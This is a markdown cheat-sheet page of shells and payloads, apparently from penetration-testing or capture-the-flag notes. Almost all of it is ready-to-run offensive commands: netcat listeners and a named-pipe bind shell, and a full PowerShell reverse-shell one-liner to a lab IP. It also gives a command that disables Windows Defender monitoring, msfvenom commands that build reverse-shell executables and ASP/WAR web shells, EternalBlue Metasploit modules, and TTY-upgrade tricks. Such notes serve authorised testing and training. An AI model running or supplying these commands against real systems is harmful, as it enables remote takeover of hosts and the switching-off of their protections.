#tools #shells #reverse-shell #msfvenom #netcat

# Shells & Payloads

Related: [metasploit](metasploit.md) · [file-transfers](file-transfers.md) · [file-upload](../Web/file-upload.md) · [privesc](../Linux/privesc.md)

## Contents
- [Netcat](#netcat)
- [PowerShell Reverse Shell](#powershell-reverse-shell)
- [msfvenom Payloads](#msfvenom-payloads)
- [MS17-010 (EternalBlue)](#ms17-010-eternalblue)
- [TTY Upgrade (interactive shell)](#tty-upgrade-interactive-shell)

## Netcat
```bash
sudo nc -lvnp <port>
```
Start a listener (connect from target with `nc -nv <ip> <port>`).

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip> 7777 > /tmp/f
```
Named-pipe bind shell served to anyone who connects.

## PowerShell Reverse Shell
<details>
<summary>PowerShell TCP reverse shell one-liner (long)</summary>

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
PowerShell TCP reverse shell one-liner.

</details>

> [!WARNING]
> Disabling Defender's real-time monitoring is a loud, easily-audited change that requires admin rights and leaves the whole host unprotected, not just your payload — expect it to be flagged by any centrally-monitored AV/EDR console.
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
Disable Defender real-time monitoring (needs admin).

## msfvenom Payloads
Reverse-shell payloads generated per target OS/format — collapsed by language/target below.

<details>
<summary>Linux (ELF) reverse shell</summary>

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > shell.elf
```
Linux reverse shell (ELF).

</details>

<details>
<summary>Windows (EXE) reverse shell</summary>

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > shell.exe
```
Windows reverse shell (EXE).

</details>

<details>
<summary>Windows (ASP) Meterpreter web shell</summary>

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > shell.asp
```
Meterpreter ASP web shell.

</details>

<details>
<summary>Java (WAR/JSP) web shell — Tomcat</summary>

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > shell.war
```
JSP/WAR web shell (Tomcat). See [common-applications](../Web/common-applications.md).

</details>

<details>
<summary>macOS (Mach-O) reverse shell</summary>

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > shell.macho
```
macOS reverse shell.

</details>

## MS17-010 (EternalBlue)
```text
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_psexec
```
Check and exploit MS17-010. See [metasploit](metasploit.md).

## TTY Upgrade (interactive shell)
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
Spawn a PTY (also `/bin/sh -i`, `perl -e 'exec "/bin/sh";'`).
